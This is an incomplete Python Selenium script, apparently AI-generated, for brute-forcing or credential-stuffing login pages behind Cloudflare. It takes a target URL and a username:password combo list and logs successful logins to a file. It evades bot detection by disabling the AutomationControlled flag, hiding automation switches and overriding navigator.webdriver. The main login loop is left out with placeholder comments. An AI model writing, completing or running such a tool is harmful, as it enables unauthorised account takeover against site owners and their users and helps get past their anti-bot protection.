# --- AI SIGNATURE: FINAL WEBDIVER-MANAGER BRUTEFORCE ---
import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.common.exceptions import NoSuchElementException, WebDriverException, TimeoutException
from tqdm import tqdm
import time
from colorama import Fore, Style, init

init(autoreset=True)

parser = argparse.ArgumentParser(description="Selenium ile Cloudflare korumalı login brute force aracı (combo wordlist)")
parser.add_argument('--url', required=True, help='Hedef login sayfası URL')
parser.add_argument('--combo', required=True, help='Combo wordlist dosyası (username:password)')
parser.add_argument('--headless', action='store_true', help='Tarayıcıyı arka planda (görünmeden) çalıştır (HATA ALIRSANIZ BUNU KALDIRIN)')
args = parser.parse_args()
args.url = args.url.strip()

combos = []
# ... (geri kalan kod aynı) ...
# Sadece driver başlatma kısmı değişecek

print(f"[+] {len(combos)} combo (username:password) yüklendi.")

chrome_options = Options()
if args.headless:
    print("DEBUG: Headless (arka plan) modda çalıştırılıyor.")
    chrome_options.add_argument('--headless')
else:
    print("DEBUG: Görünür tarayıcı modunda çalıştırılıyor.")
    
# ... (stabilite ayarları aynı) ...
chrome_options.add_argument('--window-size=1280x800')
chrome_options.add_argument("--disable-blink-features=AutomationControlled")
chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
chrome_options.add_experimental_option('useAutomationExtension', False)


success_log = open('success.txt', 'w', encoding='utf-8')
driver = None

try:
    print("DEBUG: webdriver-manager ile uyumlu chromedriver indiriliyor/kontrol ediliyor...")
    # webdriver-manager kullanarak driver'ı başlat
    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)
    print("DEBUG: Tarayıcı başlatıldı.")

    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    # ... (kodun geri kalanı aynı) ...

except Exception as e:
    print(f"\n{Fore.RED}KRİTİK HATA: {e}")
finally:
    if driver:
        driver.quit()
    success_log.close()
    print("\n[+] Tarama tamamlandı.")

# --- AI SIGNATURE: FINAL WEBDIVER-MANAGER BRUTEFORCE BITIS --- 